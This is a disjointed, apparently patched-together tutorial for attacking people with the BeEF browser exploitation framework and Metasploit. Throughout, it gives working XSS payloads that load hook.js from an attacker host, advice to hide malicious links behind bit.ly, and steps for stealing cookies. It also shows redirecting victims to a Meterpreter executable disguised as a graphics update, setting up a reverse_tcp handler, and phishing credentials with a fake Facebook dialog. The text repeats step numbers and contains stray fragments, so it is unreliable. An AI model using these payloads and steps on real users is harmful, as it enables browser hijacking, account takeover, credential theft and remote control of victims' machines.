All Needed Ports Forwarded
First things first, you need to make sure you have these ports forwarded on your router. 
On mine it shows in the advance settings NAT >

< Port Forwarding.

then i can add all the ports i need for beef to work.

Add These Ports 3000, 5432, 55552, 53, 80

Step 2

Add the Ip into Beef config.yaml

root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss# leafpad config.yaml

this should now open up the beef config file as so.
put your public ip in here

dnshost "your public ip" 
db_host "Your Public Ip"_

now close and save that file.
192.
Step 3

Metasploit Config.yaml
now once that is saved and closed you should still see

Root@Kali:~# /Usr/Share/Beef-Xss
Type Cd Extensions/Metasploit/
Root@Kali:/Usr/Share/Beef-Xss/Extensions/Metasploit#
then while in there type leafpad config.yaml

And where i have put !!your ip here!!

Host "192.168.56.1"
callback_host "Yourpublicip"_
and also make sure when you do its only numbers , no http://
just XX.XXX.XXX.XXX

now save this file and close.

now when you load beef framework up again.

Replace Your Public Ip Before >>> :3000/Ui/Authentication
Replace [Http://127.0.0.1 ]
with Your Public Ip
>>>>> [Http://127.0.0.1:3000/Ui/Authentication ]
>>>>> XX.XXX.XXX.XXX:3000/Ui/Authentication
thats it.

Opening a Browser to BeEF
The BeEF server can be accessed via any browser on our localhost (127.0.0.1) web server at port 3000. 
To access its authentication page, go to:

http://localhost:3000/ui/authentication

The default credentials are "beef" for both username and password.

"Hooked Browsers" explorer after I clicked on the link to the demo page. 
BeEF also displays its "Getting Started" window to the right.

Step 3
Hooking a Browser
The key to success with BeEF is to "hook" a browser. 

Step 5
Running Commands in the Browser
Get Visited Domains
Get Visited URLs
Webcam
Get All Cookies
Grab Google Contacts

Step 6
Getting Cookies
"Chrome Extensions" and select "Get All Cookies"

click on the "Execute" 
Obviously, once you have the user's cookies, you are likely to have access to their websites as well.


Fire It Up
Sign in with the default credentials beef/beef.
Before being able to fully explore the framework you will have to 'hook' a browser. 
To begin with you can point a browser towards the basic demo page here, or the advanced version here."

Step 3
HOOKED BROWSERS, in the online browsers section you will see 127.0.0.1, Success!

Step 4
Beat the Meat

Step 5
Redirect Command
"Browser"
"Hooked Domain"
"Browser Redirection"

"execute"
( it will be at 192.168..:3000/demos/basic) 
meterpreter into a file and then serving it out using Browser Redirect.

Exploiting
Step 1
Build the Malicious Code
Remember that line of text from the terminal earlier? That's the location of our malicious JS code. For me, it's 
http://10.0.2.13:3000/hook.js .

<script type=text/javascript src=http://10.0.2.13:3000/hook.js ></script>

Step 2
Making the URL
This is the part of the URL that tells the website what is being searched. 
By using XSS, we can take this even further to run pretty much whatever we want. When we build our url, it should look like http://victimsite.com/search.asp?query=<script type=text/javascript src=http://10.0.2.13:3000/hook.js ></script>

Step 3
Sending to a Victim
In order to "hook" their browser, we need to send them this link. 
But of course, this might seem suspicious to the average user. 

Most websites that allow you to share articles/videos, etc. automatically include a bit.ly link in the message. If you were to share this bit.ly link on Twitter, no one will think of it being malicious.

Doesn't that look much better than http://victimsite.com/search.asp?query=<script type=text/javascript src=http://10.0.2.13:3000/hook.js ></script>? I think so.

Step 4
Done!
Once someone clicks on that innocent-looking link, you will have complete control over their browser! If you are attacking over WAN, don't forget to port forward.

Creating a Shell
Now that we have a persistent connection, we can do all sorts of things with the browser. 
We can play sounds, check information, and even try to exploit the machine. 
What we're going to do now is create a Meterpreter shell with Metasploit. 
We don't actually need BeEF to do this, though.

Step 1
Creating the Payload
Go ahead and make a payload that you want to execute. 
I'll just use a basic Meterpreter payload for this example. 
Rename this to something innocent or related like HTML5 Updated Graphics.

Step 2
Create the Listener
Open Metasploit and type 
use /multi/handler 
set payload windows/meterpreter/reverse_tcp (or whatever payload you used). 
Type exploit -j -z
Upload this to your webserver.


Step 3
Creating a Malicious URL
<script>document.location="http://10.0.2.13/update.exe ";</script>

The URL for this search query is http://www.insecurelabs.org/Task/Rule1?query=<script>document.location="http://10.0.2.13/update.exe ";</script>

Step 4
Wait for the Connection
Send this link
got a Meterpreter session!
migrate and do whatever on their system! 

Step 3
Hook the Victim's Browser

"hook" their browser. This can be done in innumerable ways.
"Click here for more information" or "Click here to see the video." Use your imagination.

<script src= "http://192.168.1.101:3000/hook.js&#8221 ; type= "text/javascript" ></script>

Step 4
Send a Dialog Box to the User
"Hooked Browsers"
"Commands"
"Modules Tree"
"Social Engineering"
"Pretty Theft"
"Module Results History"
"Pretty Theft" window.
"Dialog Type"
Facebook dialog type
"Execute"

Step 5
"Execute"

Step 6
Harvest the Credentials
"Command results"
"loveofmylife@gmail.com"
"sweetbippy"